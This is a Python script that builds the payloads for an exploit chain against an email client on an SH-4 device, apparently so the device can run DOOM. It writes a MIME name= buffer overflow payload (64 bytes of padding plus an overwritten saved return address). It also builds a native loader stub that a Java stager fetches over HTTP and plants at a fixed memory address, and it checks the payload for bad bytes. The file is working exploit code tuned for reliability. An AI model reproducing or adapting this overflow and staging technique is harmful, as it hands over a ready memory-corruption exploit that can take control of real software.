#!/usr/bin/env python3
"""Build the TINY email + the native stub for the reliable HTTP-staged DOOM chain.

Reliability fix: the SH-4 loader stub is no longer carried on the stack (whose address
at trigger time varies by ~32KB, making a fixed saved-PR a coin flip). Instead:

  * Python builds the stub here and writes it to build/stub.bin.
  * Java StageDoom (reliable) fetches /stub.bin and plants it at a FIXED, deterministic
    address 0x8C29ADE8 via the setRawDeviceID(100) memcpy primitive (read-modify-write,
    so the browser stays alive).
  * This email carries ONLY  pad(64) + saved-PR = 0x8C29ADE8.  The MIME name= overflow's
    rts jumps straight to the planted stub -- no sled, no stack dependence.

We DELETE doom_blob.txt so mail_poc serves a clean, tiny message."""
import sys, struct, os
ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)
import importlib, doom_full as F; importlib.reload(F)
import sh4_asm as A

PR_STUB = 0x8C29ADE8   # DST(0x8C29ABE6) + 0x202 : where StageDoom plants the stub (byte-safe E8 AD 29 8C)

# fixed magic shared with StageDoom.java
open(os.path.join(ROOT, "magic.txt"), "wb").write(b"DOOMSTG1")
importlib.reload(F)                       # re-read MAGIC
assert F.MAGIC == b"DOOMSTG1", F.MAGIC
open(os.path.join(ROOT, "mail_subject.txt"), "w").write("DOOM-STAGE")

# small email => remove any stale blob so mail_poc sends only the overflow part
bf = os.path.join(ROOT, "doom_blob.txt")
if os.path.exists(bf): os.remove(bf)

doom_len = os.path.getsize(os.path.join(ROOT, "build/doom.bin"))
wad_len  = os.path.getsize(os.path.join(ROOT, "wad/doom1_trim.wad"))   # TRIMMED iwad (audio lumps removed)
stub, bad = F.full_stub_raw(doom_len, wad_len)

# stub is delivered out-of-band: Java fetches /stub.bin and plants it at a fixed address
os.makedirs(os.path.join(ROOT, "build"), exist_ok=True)
open(os.path.join(ROOT, "build/stub.bin"), "wb").write(stub)

# byte-safety check for the saved-PR overwrite (copied by the vulnerable name= path)
prb = struct.pack("<I", PR_STUB)
pr_safe = not any(b in (0x00, 0x20, 0x22) for b in prb)
payload = b"A"*64 + prb
open(os.path.join(ROOT, "name_payload.hex"), "w").write(payload.hex())

print("STAGE email: subject='DOOM-STAGE'  magic=DOOMSTG1")
print("  native stub -> build/stub.bin : %d bytes (byte-safe=%s)  (doom=%d wad=%d)"
      % (len(stub), not bad, doom_len, wad_len))
print("  PR target  = 0x%08X  byte-safe=%s  (planted by StageDoom at fixed addr)"
      % (PR_STUB, pr_safe))
print("  name= payload = %d bytes (64 pad + PR only; NO sled, NO stub)" % len(payload))
print("  reliability: stub at deterministic addr -> no stack-location dependence")
